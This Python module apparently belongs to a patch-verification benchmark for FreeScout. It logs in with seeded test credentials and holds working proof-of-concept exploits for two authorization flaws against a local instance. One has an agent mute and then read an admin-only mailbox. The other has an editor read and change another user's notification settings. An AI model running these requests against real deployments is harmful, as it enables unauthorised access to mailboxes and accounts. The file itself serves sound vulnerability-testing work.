#!/usr/bin/env python3
"""Shared plumbing for freescout-cve-2026-41903 (authz: mute->attach / notifications IDOR).

Real FreeScout login (session + CSRF) against the published 127.0.0.1:port.
PCB_TARGET_PORT overrides the default host port (compose assigns PORT_V*_0 at start).
"""
import os
import re
import json
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar

APP_HOST = {"v0": 33670, "v1": 33671, "v2": 33672}
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt and str(_pt).isdigit():
    for _v in APP_HOST:
        APP_HOST[_v] = int(_pt)

# PatchClosure: the oracle's _wait_ready() sends a Host header via poc_common.APP_SVC[version], but
# this module only ever defined APP_HOST -> AttributeError crashed readiness once the build was fixed.
# freescout's APP_URL is http://127.0.0.1:<port>, so the Host that renders the logged-in page (the
# "logout" readiness marker) is 127.0.0.1:<port>. Derive it from APP_HOST (honours PCB_TARGET_PORT).
APP_SVC = {_v: f"127.0.0.1:{APP_HOST[_v]}" for _v in APP_HOST}

ADMIN_EMAIL = "admin@pcb.local"
ADMIN_PASS = "PcbAdminPass123"
AGENT_EMAIL = "agent@pcb.local"
AGENT_PASS = "AgentPass123!"
EDITOR_EMAIL = "editor@pcb.local"
EDITOR_PASS = "EditorPass123!"


def _csrf_from(html):
    m = re.search(r'name="csrf-token" content="([^"]+)"', html) or re.search(
        r'name="_token" value="([^"]+)"', html
    )
    return m.group(1) if m else None


def _base(version):
    return f"http://127.0.0.1:{APP_HOST[version]}"


def _ids(version):
    """Seeded mailbox/admin ids from public/pcb_ids.txt."""
    url = _base(version) + "/pcb_ids.txt"
    try:
        with urllib.request.urlopen(url, timeout=15) as r:
            txt = r.read().decode("utf-8", "replace").strip()
    except Exception:
        return 1, 1
    q = urllib.parse.parse_qs(txt)
    mb = int((q.get("mailbox") or ["1"])[0] or 1)
    ad = int((q.get("admin") or ["1"])[0] or 1)
    return mb, ad


def login(version, email, password):
    base = _base(version)
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    with opener.open(urllib.request.Request(base + "/login"), timeout=30) as r:
        html = r.read().decode("utf-8", "replace")
    tok = _csrf_from(html)
    if not tok:
        return {"error": "no csrf"}
    data = urllib.parse.urlencode(
        {"email": email, "password": password, "_token": tok, "remember": "1"}
    ).encode()
    try:
        with opener.open(urllib.request.Request(base + "/login", data=data), timeout=30) as r:
            r.read()
    except Exception:
        pass
    try:
        with opener.open(urllib.request.Request(base + "/"), timeout=30) as r:
            html2 = r.read().decode("utf-8", "replace")
        tok2 = _csrf_from(html2) or tok
    except Exception:
        tok2 = tok
    return {"opener": opener, "csrf": tok2}


def seed_exploit(version, mailbox_id=None):
    """CVE-2025-48472: agent mutes the admin-only mailbox -> attach -> read mailbox name (flag)."""
    if mailbox_id is None:
        mailbox_id, _ = _ids(version)
    lr = login(version, AGENT_EMAIL, AGENT_PASS)
    if "error" in lr:
        return {"status": 500, "body": json.dumps(lr)}
    opener, csrf = lr["opener"], lr["csrf"]
    base = _base(version)
    data = urllib.parse.urlencode(
        {"action": "mute", "mailbox_id": str(mailbox_id), "mute": "1", "_token": csrf}
    ).encode()
    mute_resp = ""
    try:
        req = urllib.request.Request(
            base + "/mailbox/ajax",
            data=data,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRF-TOKEN": csrf,
                "X-XSRF-TOKEN": csrf,
            },
        )
        with opener.open(req, timeout=30) as r:
            mute_resp = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        mute_resp = e.read().decode("utf-8", "replace")[:300]
        return {"status": e.code, "body": mute_resp, "mute_resp": mute_resp[:100]}
    except Exception as e:
        return {"status": 500, "body": str(e)[:150], "mute_resp": ""}
    try:
        with opener.open(urllib.request.Request(base + f"/mailbox/{mailbox_id}"), timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
            return {"status": r.status, "body": body, "mute_resp": mute_resp[:200]}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        return {"status": e.code, "body": body, "mute_resp": mute_resp[:200]}
    except Exception as e:
        return {"status": 500, "body": str(e)[:150], "mute_resp": mute_resp[:200]}


def residual_exploit(version, admin_id=None):
    """CVE-2026-41903: editor (PERM_EDIT_USERS) POSTs notificationsSave then reads the page."""
    if admin_id is None:
        _, admin_id = _ids(version)
    lr = login(version, EDITOR_EMAIL, EDITOR_PASS)
    if "error" in lr:
        return {"status": 500, "body": json.dumps(lr)}
    opener, csrf = lr["opener"], lr["csrf"]
    base = _base(version)
    url = base + f"/users/notifications/{admin_id}"
    try:
        with opener.open(urllib.request.Request(url), timeout=30) as r:
            get_body = r.read().decode("utf-8", "replace")
            csrf2 = _csrf_from(get_body) or csrf
            get_status = r.status
    except urllib.error.HTTPError as e:
        get_body = e.read().decode("utf-8", "replace")
        csrf2 = csrf
        get_status = e.code
        if get_status in (401, 403):
            return {"status": get_status, "body": get_body}
    except Exception as e:
        return {"status": 500, "body": str(e)[:150]}

    # Write path: same authorize('update') as GET (GHSA-f489 / CVE-2026-41903).
    post_data = urllib.parse.urlencode(
        [
            ("_token", csrf2),
            ("subscriptions[1][]", "1"),
        ]
    ).encode()
    try:
        req = urllib.request.Request(
            url,
            data=post_data,
            headers={"X-CSRF-TOKEN": csrf2, "X-Requested-With": "XMLHttpRequest"},
        )
        with opener.open(req, timeout=30) as r:
            post_body = r.read().decode("utf-8", "replace")
            post_status = r.status
    except urllib.error.HTTPError as e:
        post_body = e.read().decode("utf-8", "replace")
        post_status = e.code
    except Exception as e:
        post_body = str(e)[:150]
        post_status = 500

    body = get_body + "\n" + post_body
    status = post_status if post_status not in (401, 403) else post_status
    if get_status not in (401, 403) and post_status in (401, 403):
        status = get_status
    return {"status": status, "body": body, "get_status": get_status, "post_status": post_status}
